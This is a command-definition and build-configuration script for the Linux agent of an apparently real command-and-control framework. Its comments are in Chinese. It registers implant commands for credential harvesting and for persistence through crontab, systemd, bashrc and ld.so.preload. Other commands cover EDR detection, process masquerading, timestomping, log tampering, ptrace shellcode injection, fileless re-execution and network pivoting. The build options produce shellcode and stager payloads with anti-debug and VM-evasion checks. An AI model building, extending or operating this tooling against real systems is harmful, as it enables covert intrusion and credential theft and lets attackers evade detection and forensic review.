/// Linux Agent (Native C)

let exit_action = menu.create_action("Exit", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "exit")) });
menu.add_session_agent(exit_action, ["linux"])

let file_browser_action     = menu.create_action("File Browser",    function(agents_id) { agents_id.forEach(id => ax.open_browser_files(id)) });
let process_browser_action  = menu.create_action("Process Browser", function(agents_id) { agents_id.forEach(id => ax.open_browser_process(id)) });
let terminal_browser_action = menu.create_action("Remote Terminal", function(agents_id) { agents_id.forEach(id => ax.open_remote_terminal(id)) });
menu.add_session_browser(file_browser_action, ["linux"])
menu.add_session_browser(process_browser_action, ["linux"])
menu.add_session_browser(terminal_browser_action, ["linux"])

let tunnel_access_action = menu.create_action("Create Tunnel", function(agents_id) { ax.open_access_tunnel(agents_id[0], true, true, false, false) });
menu.add_session_access(tunnel_access_action, ["linux"]);


let execute_action = menu.create_action("Execute", function(files_list) {
    file = files_list[0];
    if(file.type != "file"){ return; }

    let label_bin = form.create_label("Binary:");
    let text_bin = form.create_textline(file.path + file.name);
    text_bin.setEnabled(false);
    let label_args = form.create_label("Arguments:");
    let text_args = form.create_textline();

    let layout = form.create_gridlayout();
    layout.addWidget(label_bin, 0, 0, 1, 1);
    layout.addWidget(text_bin, 0, 1, 1, 1);
    layout.addWidget(label_args, 1, 0, 1, 1);
    layout.addWidget(text_args, 1, 1, 1, 1);

    let dialog = form.create_dialog("Execute binary");
    dialog.setSize(500, 80);
    dialog.setLayout(layout);
    if ( dialog.exec() == true )
    {
        let command = "run " + text_bin.text() + " " + text_args.text();
        ax.execute_command(file.agent_id, command);
    }
});
let download_action = menu.create_action("Download", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "download " + file.path + file.name) ) });
let remove_action = menu.create_action("Remove", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "rm " + file.path + file.name) ) });
menu.add_filebrowser(download_action, ["linux"])
menu.add_filebrowser(remove_action, ["linux"])


let job_stop_action = menu.create_action("Stop job", function(tasks_list) {
    tasks_list.forEach((task) => {
        if(task.type == "JOB" && task.state == "Running") {
            ax.execute_command(task.agent_id, "job kill " + task.task_id);
        }
    });
});
menu.add_tasks_job(job_stop_action, ["linux"])


let cancel_action = menu.create_action("Cancel", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "job kill " + file.file_id) ) });
menu.add_downloads_running(cancel_action, ["linux"])



var event_files_action = function(id, path) {
    ax.execute_browser(id, "ls " + path);
}
event.on_filebrowser_list(event_files_action, ["linux"]);

var event_upload_action = function(id, path, filepath) {
    let filename = ax.file_basename(filepath);
    ax.execute_browser(id, "upload " + filepath + " " + path + filename);
}
event.on_filebrowser_upload(event_upload_action, ["linux"]);

var event_process_action = function(id) {
    ax.execute_browser(id, "ps");
}
event.on_processbrowser_list(event_process_action, ["linux"]);



function RegisterCommands(listenerType)
{
    let cmd_cat = ax.create_command("cat", "读取文件（上限 1 MB）", "cat /etc/passwd", "Task: read file");
    cmd_cat.addArgString("path", true);

    let cmd_cd = ax.create_command("cd", "切换当前工作目录", "cd /home/user", "Task: change working directory");
    cmd_cd.addArgString("path", true);

    let cmd_cp = ax.create_command("cp", "复制文件或目录", "cp src.txt dst.txt", "Task: copy file or directory");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    let cmd_download = ax.create_command("download", "下载文件", "download /tmp/file", "Task: download file");
    cmd_download.addArgString("path", true);

    let cmd_exit = ax.create_command("exit", "终止 agent", "exit", "Task: terminate agent");

    let cmd_getuid = ax.create_command("getuid", "获取当前用户与 UID", "getuid", "Task: get user info");

    let cmd_whoami = ax.create_command("whoami", "获取当前用户与 UID（getuid 别名）", "whoami", "Task: get user info");

    let cmd_ipconfig = ax.create_command("ipconfig", "列出网络连接（netstat 别名）", "ipconfig", "Task: list connections");

    let cmd_env = ax.create_command("env", "列出环境变量", "env", "Task: list env");

    let cmd_netstat = ax.create_command("netstat", "列出网络连接（TCP/UDP）", "netstat", "Task: list connections");

    let cmd_mounts = ax.create_command("mounts", "列出挂载点", "mounts", "Task: list mounts");

    let cmd_edr = ax.create_command("edr", "检测已安装的安全工具（EDR、AV、审计）", "edr", "Task: EDR detection");

    let cmd_creds = ax.create_command("creds", "凭据收集", "creds all", "Task: credential harvest");
    cmd_creds.addArgString("type", "", "all");

    let _cmd_persist_crontab = ax.create_command("crontab", "安装 crontab 持久化", "persist crontab /tmp/agent \"*/5 * * * *\"");
    _cmd_persist_crontab.addArgString("cmd", true);
    _cmd_persist_crontab.addArgString("schedule", "", "*/5 * * * *");
    let _cmd_persist_systemd = ax.create_command("systemd", "安装 systemd 用户服务", "persist systemd myservice /tmp/agent");
    _cmd_persist_systemd.addArgString("name", true);
    _cmd_persist_systemd.addArgString("cmd", true);
    let _cmd_persist_bashrc = ax.create_command("bashrc", "追加到 ~/.bashrc", "persist bashrc \"/tmp/agent &\"");
    _cmd_persist_bashrc.addArgString("cmd", true);
    let _cmd_persist_ldpreload = ax.create_command("ldpreload", "写入 /etc/ld.so.preload（需 root）", "persist ldpreload /tmp/agent.so");
    _cmd_persist_ldpreload.addArgString("path", true);
    let _cmd_persist_remove = ax.create_command("remove", "移除持久化", "persist remove crontab");
    _cmd_persist_remove.addArgString("type", true);
    _cmd_persist_remove.addArgString("name", false);
    let _cmd_persist_status = ax.create_command("status", "列出活动的持久化机制", "persist status");
    let cmd_persist = ax.create_command("persist", "持久化管理");
    cmd_persist.addSubCommands([_cmd_persist_crontab, _cmd_persist_systemd, _cmd_persist_bashrc, _cmd_persist_ldpreload, _cmd_persist_remove, _cmd_persist_status]);

    let _cmd_container_detect = ax.create_command("detect", "检测容器运行时与云厂商", "container detect");
    let _cmd_container_metadata = ax.create_command("metadata", "获取云实例元数据（IMDS）", "container metadata");
    let cmd_container = ax.create_command("container", "容器/云环境检测与元数据");
    cmd_container.addSubCommands([_cmd_container_detect, _cmd_container_metadata]);

    let cmd_masquerade = ax.create_command("masquerade", "伪装进程名（OPSEC）", "masquerade [kworker/0:1-events]", "Task: masquerade process");
    cmd_masquerade.addArgString("name", "", "[kworker/0:1-events]");

    let cmd_timestomp = ax.create_command("timestomp", "修改文件时间戳（OPSEC）", "timestomp /tmp/agent 0", "Task: timestomp");
    cmd_timestomp.addArgString("path", true);
    cmd_timestomp.addArgInt("timestamp", "", 0);

    let cmd_cleanlog = ax.create_command("cleanlog", "日志处理：默认 auditd 判定 + journald 轮转清归档（不破坏文件完整性）；给 path+pairs 则等长就地改写", "cleanlog", "Task: clean logs");
    cmd_cleanlog.addArgString("path", "要等长就地改写的文件（留空=默认安全清理）", "");
    cmd_cleanlog.addArgString("pairs", "改写对 needle=repl;needle=repl（repl 自动对齐长度，文件大小不变）", "");

    let cmd_inject = ax.create_command("inject", "通过 ptrace 向进程注入 shellcode", "inject 1234 AAAA", "Task: inject shellcode");
    cmd_inject.addArgInt("pid", true);
    cmd_inject.addArgString("shellcode", true);

    let cmd_migrate = ax.create_command("migrate", "从 memfd 重新执行 agent（无文件）", "migrate", "Task: migrate agent");

    let _cmd_job_list = ax.create_command("list", "任务列表", "job list", "Task: show jobs");
    let _cmd_job_kill = ax.create_command("kill", "终止指定任务", "job kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    let cmd_job = ax.create_command("job", "长时间运行任务管理");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    let cmd_kill = ax.create_command("kill", "结束指定 PID 的进程", "kill 7865", "Task: kill process");
    cmd_kill.addArgInt("pid", true);

    let cmd_ls = ax.create_command("ls", "列出目录内容", "ls /home/", "Task: list files");
    cmd_ls.addArgString("path", "", ".");

    let cmd_mv = ax.create_command("mv", "移动/重命名文件或目录", "mv src.txt dst.txt", "Task: move file");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    let cmd_mkdir = ax.create_command("mkdir", "创建目录", "mkdir /tmp/ex", "Task: make directory");
    cmd_mkdir.addArgString("path", true);

    let _cmd_ps_kill = ax.create_command("kill", "结束指定 PID 的进程", "ps kill 7865", "Task: kill process");
    _cmd_ps_kill.addArgInt("pid", true);
    let cmd_ps = ax.create_command("ps", "显示进程列表 / 按 PID 结束进程", "ps", "Task: show process list");
    cmd_ps.addSubCommands([_cmd_ps_kill]);

    let cmd_pwd = ax.create_command("pwd", "显示当前工作目录", "pwd", "Task: print working directory");

    let cmd_rm = ax.create_command("rm", "删除文件或目录", "rm /tmp/file", "Task: remove file or directory");
    cmd_rm.addArgString("path", true);

    let cmd_run = ax.create_command("run", "后台执行程序", "run /tmp/script.sh", "Task: command run");
    cmd_run.addArgString("program", true);
    cmd_run.addArgString("args", false);

    let _cmd_socks_start = ax.create_command("start", "启动 SOCKS5 代理服务", "socks start 1080 -a user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "监听地址", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "监听端口");
    _cmd_socks_start.addArgBool("-a", "启用用户名/密码认证");
    _cmd_socks_start.addArgString("username", false, "用户名");
    _cmd_socks_start.addArgString("password", false, "密码");
    let _cmd_socks_stop = ax.create_command("stop", "停止 SOCKS 代理服务", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "SOCKS 隧道管理");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    let cmd_shell = ax.create_command("shell", "通过 /bin/sh 执行命令", "shell id", "Task: command execute");
    cmd_shell.addArgString("cmd", true);

    let cmd_upload = ax.create_command("upload", "上传文件", "upload /tmp/file.txt /root/file.txt", "Task: upload file");
    cmd_upload.addArgFile("local_file", true);
    cmd_upload.addArgString("remote_path", false);

    let cmd_link = ax.create_command("link", "通过 TCP 中转连接子 agent", "link 192.168.1.10 4444", "Task: link pivot");
    cmd_link.addArgString("target", true);
    cmd_link.addArgInt("port", true);

    let cmd_unlink = ax.create_command("unlink", "断开中转连接", "unlink p0", "Task: unlink pivot");
    cmd_unlink.addArgString("id", true);

    // 反向 pivot：父 agent 监听，子 agent 拨入（见 pivot.c pivot_listen_tcp
    // / main.c bind 分支）。port=0 停止监听。
    let cmd_listen = ax.create_command("listen", "反向 pivot：本机监听端口，等待子 agent 拨入（0 = 停止）", "listen 4444", "Task: listen pivot");
    cmd_listen.addArgInt("port", true);

    let _cmd_exec_bof = ax.create_command("bof", "在内存中执行 BOF（ELF .o 文件）", "execute bof /path/to/bof.o", "Task: execute BOF");
    _cmd_exec_bof.addArgFile("bof", true);
    _cmd_exec_bof.addArgString("param_data", false);
    _cmd_exec_bof.addArgBool("async", false);
    let cmd_execute = ax.create_command("execute", "在内存中执行 BOF 文件");
    cmd_execute.addSubCommands([_cmd_exec_bof]);

    let commands = ax.create_commands_group("linux", [cmd_cat, cmd_cd, cmd_cleanlog, cmd_container, cmd_cp, cmd_creds, cmd_download, cmd_edr, cmd_env, cmd_execute, cmd_exit, cmd_getuid, cmd_whoami, cmd_ipconfig, cmd_inject, cmd_job, cmd_kill, cmd_link, cmd_listen, cmd_ls, cmd_masquerade, cmd_migrate, cmd_mounts, cmd_mv, cmd_mkdir, cmd_netstat, cmd_persist, cmd_ps, cmd_pwd, cmd_rm, cmd_run, cmd_shell, cmd_socks, cmd_timestomp, cmd_unlink, cmd_upload]);

    return {
        commands_linux: commands
    }
}

function GenerateUI(listeners_type)
{
    let labelArch = form.create_label("Arch:");
    let comboArch = form.create_combo()
    comboArch.addItems(["x86_64", "ARM64"]);

    let labelFormat = form.create_label("Format:");
    let comboFormat = form.create_combo()
    comboFormat.addItems(["Binary ELF (Native)", "Shared Object (Native)", "Shellcode x86_64 (Native)", "Shellcode ARM64 (Native)", "Stager"]);
    let labelStagerHint = form.create_label("Stager = small loader; payload on TS (/api/s/<token>), one-shot + 24h TTL.");


    let hline = form.create_hline()

    let labelReconnTimeout = form.create_label("Reconnect timeout:");
    let textReconnTimeout = form.create_textline("10");
    textReconnTimeout.setPlaceholder("seconds")

    let labelReconnCount = form.create_label("Reconnect count:");
    let spinReconnCount = form.create_spin();
    spinReconnCount.setRange(0, 1000000000);
    spinReconnCount.setValue(3);

    // Hide reconnect settings for bind_tcp listeners (internal — no outbound connection)
    if( listeners_type.includes("LinuxTCP") && listeners_type.length == 1 ) {
        labelReconnTimeout.setVisible(false);
        textReconnTimeout.setVisible(false);
        labelReconnCount.setVisible(false);
        spinReconnCount.setVisible(false);
    }

    let hline2 = form.create_hline()
    let checkOpsec = form.create_check("OPSEC Checks (anti-debug, VM detection, string obfuscation)")
    let checkOpsecVmExit = form.create_check("VM detection blocks check-in (cloud KVM/QEMU hosts WILL be blocked)");

    let layout = form.create_gridlayout();
    layout.addWidget(labelArch, 0, 0, 1, 1);
    layout.addWidget(comboArch, 0, 1, 1, 1);
    layout.addWidget(labelFormat, 1, 0, 1, 1);
    layout.addWidget(comboFormat, 1, 1, 1, 1);
    layout.addWidget(labelStagerHint, 6, 0, 1, 2);
    layout.addWidget(hline, 2, 0, 1, 2);
    layout.addWidget(labelReconnTimeout, 3, 0, 1, 1);
    layout.addWidget(textReconnTimeout, 3, 1, 1, 1);
    layout.addWidget(labelReconnCount, 4, 0, 1, 1);
    layout.addWidget(spinReconnCount, 4, 1, 1, 1);
    layout.addWidget(hline2, 5, 0, 1, 2);
    layout.addWidget(checkOpsec, 6, 0, 1, 2);
    layout.addWidget(checkOpsecVmExit, 7, 0, 1, 2);

    let container = form.create_container()
    container.put("arch", comboArch)
    container.put("format", comboFormat)
    container.put("reconn_timeout", textReconnTimeout)
    container.put("reconn_count", spinReconnCount)
    container.put("opsec_enabled", checkOpsec)
    container.put("opsec_vm_exit", checkOpsecVmExit)

    let panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 430,
        ui_width: 550
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
   BuildSchema —— 给 **Web 控制台**（AdaptixWeb）的生成参数表。

   与上面 GenerateUI 并列、互不影响：GenerateUI 给 Qt 客户端本地渲染，
   BuildSchema 只返回纯数据给 Web 前端。**GenerateUI 一个字都不要动。**
   服务端调用点与下发格式见 beacon_agent/ax_config.axs 的同名块；三条纪律
   （只声明插件事实、不写 default、不写部署字面量）也照那一份，改前先读它。

   linux 的 GenerateConfig（pl_main.go:364-381）本来就只有 8 个键，Web 控制台
   **早就把这 8 个全发过** —— 所以这次迁移在语义上**零变化**，正好用来验证
   「机制通了、值没变」。

   ★ format 的五个取值是 pl_main.go:756 那个 switch 的 case 原文。注意它带
     `default: return error("unknown format")`（:790）—— 取值写错是**硬报错**，
     不像 beacon 的 dns_mode 那样静默落回 0。
   ★ arch 只影响 Stager 内层载荷的选型（:769 认 ARM64/aarch64/arm64 三种写法，
     其余值走隐含的 x86_64 分支），其它格式一律 x86_64 交叉编译。
   ★ reconn_timeout 走 pl_utils.go:448 的 parseDurationToSeconds，它会在没有单位时
     自动补 "s" ⇒ 填 "10" 就是 10 秒，填 "30s"/"5m" 也认。这条**只对 linux 成立**：
     beacon 的同名函数（pl_utils.go:414）没有补 "s" 的兜底，那边填裸数字会得到 0。
   ═══════════════════════════════════════════════════════════════════════════ */
function BuildSchema(listener_type)
{
    let F_STAGER = ["Stager"];   // pl_main.go:765 的 case 原文

    return {
        version: 1,
        fields: [
            { key: "format", label: "输出格式", type: "select",
              options: ["Binary ELF (Native)", "Shared Object (Native)", "Shellcode x86_64 (Native)", "Shellcode ARM64 (Native)", "Stager"],
              group: "基础" },
            { key: "arch",   label: "架构",     type: "select", options: ["x86_64", "ARM64"], group: "基础",
              hint: "只影响 Stager 内层载荷的选型（pl_main.go:769）" },
            { key: "reconn_timeout", label: "重连间隔", type: "text", placeholder: "10 / 30s / 5m",
              group: "重连与 OPSEC", hint: "纯数字按秒算（插件会自动补 s，pl_utils.go:448）" },
            { key: "reconn_count", label: "重连次数", type: "number", min: 0, max: 1000000000,
              group: "重连与 OPSEC", hint: "0 = 无限重连" },
            { key: "opsec_enabled", label: "OPSEC 检测（反调试 / VM 检测 / 字符串混淆）", type: "bool",
              group: "重连与 OPSEC" },
            { key: "opsec_vm_exit", label: "VM 检测命中即不上线", type: "bool",
              group: "重连与 OPSEC",
              hint: "默认关：云主机（KVM/QEMU ECS）与分析沙箱不可区分，默认拦截会误杀全部云目标。只打物理机的行动才勾选" },
            { key: "stager_ts_host", label: "Teamserver 地址", type: "text",
              group: "Stager 下载端点", group_open: true, show_if: { format_in: F_STAGER },
              hint: "内层载荷挂在 teamserver 自己的 /api/s/<token> 上，不是监听器端口；控制台默认填当前页面的地址" },
            { key: "stager_ts_port", label: "端口", type: "number", min: 0, max: 65535,
              group: "Stager 下载端点", show_if: { format_in: F_STAGER } },
            { key: "stager_ts_ssl", label: "走 TLS（与 Teamserver.ssl 一致）", type: "bool",
              group: "Stager 下载端点", show_if: { format_in: F_STAGER } }
        ]
    };
}
